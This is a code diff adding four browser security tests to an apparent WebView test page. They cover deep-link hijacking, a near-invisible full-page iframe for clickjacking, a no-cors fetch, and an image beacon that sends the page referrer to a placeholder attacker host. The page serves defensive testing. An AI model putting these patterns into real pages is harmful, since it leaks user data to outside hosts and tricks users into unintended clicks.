@@ -88,6 +88,34 @@
                 .then(data => alert('File access granted: ' + data.substring(0, 50)))
                 .catch(err => alert('File access denied: ' + err));
         }
+
+        function testDeepLinkHijack() {
+            window.location.href = "intent://malicious-app#Intent;scheme=https;package=com.android.chrome;end";
+        }
+
+        function testClickjacking() {
+            let frame = document.createElement('iframe');
+            frame.style.position = 'absolute';
+            frame.style.opacity = '0.01';
+            frame.style.width = '100%';
+            frame.style.height = '100%';
+            frame.src = "https://malicious-site.com";
+            document.body.appendChild(frame);
+            alert('Clickjacking test: Hidden iframe added.');
+        }
+
+        function testCORS() {
+            fetch('https://evil-site.com/api/data', { mode: 'no-cors' })
+                .then(res => alert('CORS test: Request went through!'))
+                .catch(err => alert('CORS test: Blocked by policy - ' + err));
+        }
+
+        function testReferrerLeakage() {
+            let img = new Image();
+            img.src = "https://attacker-site.com/log?referrer=" + document.referrer;
+            document.body.appendChild(img);
+            alert('Referrer sent to attacker site: ' + document.referrer);
+        }
     </script>
 </head>
 <body>
@@ -103,6 +131,9 @@
     <button onclick="testAutoNavigation()">Test Auto Navigation</button>
     <button onclick="testJavaScriptInjection()">Test JavaScript Injection</button>
     <button onclick="testFileAccess()">Test File Access</button>
+    <button onclick="testDeepLinkHijack()">Test Deep Link Hijacking</button>
+    <button onclick="testClickjacking()">Test Clickjacking</button>
+    <button onclick="testCORS()">Test CORS Security</button>
+    <button onclick="testReferrerLeakage()">Test Referrer Leakage</button>
 </body>
 </html>
-
